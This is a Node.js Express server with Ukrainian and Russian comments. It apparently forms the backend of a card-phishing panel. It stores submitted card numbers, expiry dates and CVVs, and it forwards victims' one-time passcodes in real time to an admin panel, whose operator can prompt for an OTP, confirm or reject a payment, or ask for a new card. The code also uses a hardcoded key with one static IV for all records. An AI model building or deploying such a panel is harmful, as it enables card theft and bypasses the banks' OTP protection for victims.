const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const socketIO = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const helmet = require('helmet');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const crypto = require('crypto');
const cors = require('cors');

// Налаштування логера
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.simple()
  }));
}

// Налаштування шифрування
const algorithm = 'aes-256-cbc';
const key = crypto.scryptSync('your-32-byte-secret-key-here!!!!!!!!', 'salt', 32);
const iv = crypto.randomBytes(16);

function encrypt(text) {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

function decrypt(encrypted) {
  try {
    const decipher = crypto.createDecipheriv(algorithm, key, iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    logger.error('Ошибка расшифровки:', error);
    return '****************';
  }
}

// Налаштування бази даних
const db = new sqlite3.Database(path.join(__dirname, 'cards.db'));
db.run(`CREATE TABLE IF NOT EXISTS cards (
  id INTEGER PRIMARY KEY,
  name TEXT,
  number TEXT,
  exp TEXT,
  cvv TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Базові налаштування безпеки
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", 'cdn.jsdelivr.net'],
      styleSrc: ["'self'", "'unsafe-inline'", 'cdn.jsdelivr.net'],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'wss:', 'ws:']
    }
  },
  crossOriginEmbedderPolicy: false
}));

// Налаштування CORS
app.use(cors({
  origin: ['http://localhost:3000', 'https://localhost'],
  credentials: true
}));

// Парсинг JSON та cookies
app.use(express.json());
app.use(cookieParser());

// Rate limiting для API endpoints
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 хвилин
  max: 100 // максимум 100 запитів
});

// CSRF захист
const csrfProtection = csrf({ 
  cookie: {
    key: '_csrf',
    sameSite: 'strict'
  }
});

// Роут для отримання CSRF токену
app.get('/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Статичні файли
app.use(express.static(path.join(__dirname, '../public')));
app.use('/admin', express.static(path.join(__dirname, '../admin')));

// Middleware для обробки помилок CSRF
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    logger.error('CSRF error:', err);
    return res.status(403).json({ 
      error: 'Invalid security token',
      message: 'Please refresh the page and try again'
    });
  }
  next(err);
});

// Middleware для валідації даних карти
function validateCard(req, res, next) {
  const { name, number, exp, cvv } = req.body;
  
  if (!name || !number || !exp || !cvv) {
    return res.status(400).json({ error: 'Все поля обязательны' });
  }
  
  if (!/^\d{16}$/.test(number)) {
    return res.status(400).json({ error: 'Номер карты должен содержать 16 цифр' });
  }
  
  if (!/^\d{3}$/.test(cvv)) {
    return res.status(400).json({ error: 'CVV должен содержать 3 цифры' });
  }
  
  if (!/^\d{2}\/\d{2}$/.test(exp)) {
    return res.status(400).json({ error: 'Дата должна быть в формате MM/YY' });
  }
  
  // Перевірка терміну дії карти
  const [month, year] = exp.split('/');
  const expDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
  const now = new Date();
  
  if (expDate < now) {
    return res.status(400).json({ error: 'Карта просрочена' });
  }
  
  next();
}

// Створюємо HTTP сервер для розробки
const httpServer = http.createServer(app);
const io = socketIO(httpServer, {
  cors: {
    origin: ["http://localhost:3000", "https://localhost"],
    methods: ["GET", "POST"],
    credentials: true
  }
});

// API для картки з усіма захистами
app.post('/card', [apiLimiter, csrfProtection, validateCard], (req, res) => {
  const { name, number, exp, cvv } = req.body;
  
  // Шифруємо дані перед збереженням
  const encryptedNumber = encrypt(number);
  const encryptedCvv = encrypt(cvv);
  
  const stmt = db.prepare('INSERT INTO cards (name, number, exp, cvv) VALUES (?, ?, ?, ?)');
  stmt.run([name, encryptedNumber, exp, encryptedCvv], function(err) {
    if (err) {
      logger.error('Ошибка при сохранении карты:', err);
      return res.status(500).json({ error: 'Ошибка сервера' });
    }
    
    const cardId = this.lastID;
    // Відправляємо в адмінку дані з замаскованим номером
    const maskedNumber = number.replace(/\d(?=\d{4})/g, "*");
    const cardData = { 
      id: cardId,
      name, 
      number: maskedNumber, 
      exp,
      cvv: '***',
      created_at: new Date().toISOString()
    };
    
    io.emit('new-card', cardData);
    res.status(200).json(cardData);
  });
  stmt.finalize();
});

// API для ОТП з захистом
app.post('/otp', [apiLimiter, csrfProtection], (req, res) => {
  const { otp } = req.body;
  
  if (!otp || !/^\d{6,8}$/.test(otp)) {
    return res.status(400).json({ error: 'Неверный формат OTP' });
  }
  
  io.emit('new-otp', { otp });
  res.sendStatus(200);
});

// WebSocket для команд адміна
io.on('connection', (socket) => {
  logger.info('Новое WebSocket подключение');
  
  // Відправляємо всі картки при підключенні
  db.all('SELECT id, name, number, exp, cvv, created_at FROM cards', [], (err, rows) => {
    if (err) {
      logger.error('Ошибка при получении карт:', err);
      return;
    }
    
    const cards = rows.map(row => ({
      ...row,
      number: decrypt(row.number).replace(/\d(?=\d{4})/g, "*"),
      cvv: '***'
    }));
    
    socket.emit('cards', cards);
  });
  
  socket.on('show-otp', (data) => io.emit('show-otp-form', data));
  socket.on('confirm-payment', (data) => io.emit('payment-confirmed', data));
  socket.on('reject-otp', (data) => io.emit('otp-rejected', data));
  socket.on('request-new-card', (data) => io.emit('new-card-requested', data));
  socket.on('chat-message', (msg) => {
    if (typeof msg === 'string' && msg.trim()) {
      io.emit('chat', msg);
    }
  });
  
  socket.on('disconnect', () => {
    logger.info('WebSocket отключен');
  });
});

// Запуск серверів
const PORT = process.env.PORT || 3000;
const HTTPS_PORT = process.env.HTTPS_PORT || 443;

httpServer.listen(PORT, () => {
  logger.info(`HTTP сервер запущено на порту ${PORT}`);
});

try {
  const httpsOptions = {
    key: fs.readFileSync(path.join(__dirname, 'key.pem')),
    cert: fs.readFileSync(path.join(__dirname, 'cert.pem')),
    rejectUnauthorized: false
  };
  
  const httpsServer = https.createServer(httpsOptions, app);
  const httpsIo = socketIO(httpsServer, {
    cors: {
      origin: ["http://localhost:3000", "https://localhost"],
      methods: ["GET", "POST"],
      credentials: true
    }
  });

  // Копіюємо обробники WebSocket для HTTPS
  httpsIo.on('connection', (socket) => {
    logger.info('Новое защищенное WebSocket подключение');
    
    // Відправляємо всі картки при підключенні
    db.all('SELECT id, name, number, exp, cvv, created_at FROM cards', [], (err, rows) => {
      if (err) {
        logger.error('Ошибка при получении карт:', err);
        return;
      }
      
      const cards = rows.map(row => ({
        ...row,
        number: row.number ? decrypt(row.number).replace(/\d(?=\d{4})/g, "*") : '****************',
        cvv: '***'
      }));
      
      socket.emit('cards', cards);
    });
    
    socket.on('show-otp', (data) => httpsIo.emit('show-otp-form', data));
    socket.on('confirm-payment', (data) => httpsIo.emit('payment-confirmed', data));
    socket.on('reject-otp', (data) => httpsIo.emit('otp-rejected', data));
    socket.on('request-new-card', (data) => httpsIo.emit('new-card-requested', data));
    socket.on('chat-message', (msg) => {
      if (typeof msg === 'string' && msg.trim()) {
        httpsIo.emit('chat', msg);
      }
    });
    
    socket.on('disconnect', () => {
      logger.info('Защищенное WebSocket подключение закрыто');
    });
  });
  
  httpsServer.listen(HTTPS_PORT, () => {
    logger.info(`HTTPS сервер запущено на порту ${HTTPS_PORT}`);
  });
} catch (err) {
  logger.error('Помилка запуску HTTPS сервера:', err);
}